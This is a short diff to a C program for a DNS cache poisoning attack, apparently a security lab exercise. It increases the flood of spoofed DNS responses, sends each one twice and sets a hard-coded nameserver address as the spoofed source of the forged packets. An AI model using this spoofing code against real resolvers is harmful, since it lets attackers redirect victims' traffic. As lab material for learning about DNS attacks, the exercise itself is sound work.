@@ -32,10 +32,12 @@ int main()
 
     /* Step 2. Send many spoofed responses to the targeted local DNS server,
                each one with a different transaction ID. */
-    for (size_t i = 0; i < 200; i++)
+    for (size_t i = 0; i < 500; i++)
     {
       // send the response
       send_dns_response(name, ip_resp, n_resp, id);
+      send_dns_response(name, ip_resp, n_resp, id);
+
       // increade the id
       id++;
     }
@@ -61,6 +63,8 @@ void send_dns_request(char *name, unsigned char *ip_req, int n_req)
  * */
 void send_dns_response(char *name, unsigned char *ip_resp, int n_resp, unsigned short id)
 {
+  int ip = (int)inet_addr("199.43.133.53");
+  memcpy(ip_resp + 12,(void*)&ip, 4);
   // Modify the name in the answer field (offset=64)
   memcpy(ip_resp + 64, name, 5);
   // Modify the name in the answer field (offset=41)
